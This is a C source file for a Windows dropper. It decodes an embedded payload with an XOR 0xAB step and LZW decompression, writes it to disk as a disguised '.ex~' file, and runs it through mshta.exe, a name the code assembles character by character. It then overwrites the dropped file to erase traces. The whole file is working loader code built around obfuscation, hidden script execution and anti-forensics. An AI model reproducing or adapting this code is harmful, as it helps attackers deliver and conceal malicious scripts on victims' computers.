#include <windows.h>

#include "hta_prog.c"

#define BITS				12
#define HASHING_SHIFT		( BITS - 8 )
#define MAX_VALUE			( ( 1 << BITS ) - 1 )
#define MAX_CODE			( MAX_VALUE - 1 )
#define TABLE_SIZE			5021

unsigned int prefix_code[ TABLE_SIZE ];
unsigned char append_character[ TABLE_SIZE ];
unsigned char decode_stack[ 4000 ];

HFILE out_file;

void my_putc( unsigned char bb )
{
	_lwrite( out_file, &bb, 1 );
}

int my_getc( void )
{
	static int idx = 0;

	if( idx == SB ) return -1;

	return (int)( bb[ idx++ ] ^ 0xAB );
}

unsigned int input_code( void )
{
	unsigned int return_value;
	static int input_bit_count = 0;
	static unsigned long input_bit_buffer = 0;

	while( input_bit_count <= 24 )
	{
		input_bit_buffer |= (unsigned long)my_getc() << ( 24 - input_bit_count );
		input_bit_count += 8;
	}

	return_value = input_bit_buffer >> ( 32 - BITS );
	input_bit_buffer <<= BITS;
	input_bit_count -= BITS;

	return return_value;
}

unsigned char *decode_string( unsigned char *buffer, unsigned int code )
{
	while( code > 255 )
	{
		*buffer++ = append_character[ code ];
		code = prefix_code[ code ];
	}

	*buffer = code;

	return buffer;
}

void expand( void )
{
	unsigned int next_code;
	unsigned int new_code;
	unsigned int old_code;
	int character;
	unsigned char *string;

	next_code = 256;
	old_code = input_code();
	character = old_code;
	my_putc( old_code );

	while( ( new_code = input_code() ) != MAX_VALUE )
	{
		if( new_code >= next_code )
		{
			*decode_stack = character;
			string = decode_string( decode_stack + 1, old_code );
		}
		else string = decode_string( decode_stack, new_code );

		character = *string;
		while( string >= decode_stack ) my_putc( *string-- );

		if( next_code <= MAX_CODE )
		{
			prefix_code[ next_code ] = old_code;
			append_character[ next_code ] = character;
			next_code++;
		}

		old_code = new_code;
	}
}

void get_hta_name( char * buff )
{
	GetModuleFileName( NULL, buff, 1024 );
	int i = lstrlen( buff );
	while( buff[ i ] != '.' ) i--;
	i++;
	buff[ i++ ] = 'e';
	buff[ i++ ] = 'x';
	buff[ i++ ] = '~';
	buff[ i ] = 0;
}

void make_exe( char * s )
{
	*s++ = 'm';
	*s++ = 's';
	*s++ = 'h';
	*s++ = 't';
	*s++ = 'a';
	*s++ = '.';
	*s++ = 'e';
	*s++ = 'x';
	*s++ = 'e';
	*s = 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{
	char fname[1024];
	char command[1060];
	STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;

	get_hta_name( fname );
	out_file = _lcreat( fname, 0 );
	expand();
	_lclose( out_file );

	make_exe( command );

	lstrcat( command, " \"" );
	lstrcat( command, fname );
	lstrcat( command, "\"" );

	//MessageBox( NULL, command, "Test", MB_OK );
	CreateProcess( NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	Sleep( 2000 );

	//DeleteFile( fname );

	out_file = _lcreat( fname, 0 );
	_lwrite( out_file, "Timestamp: 0", 12 );

	return 1;
}

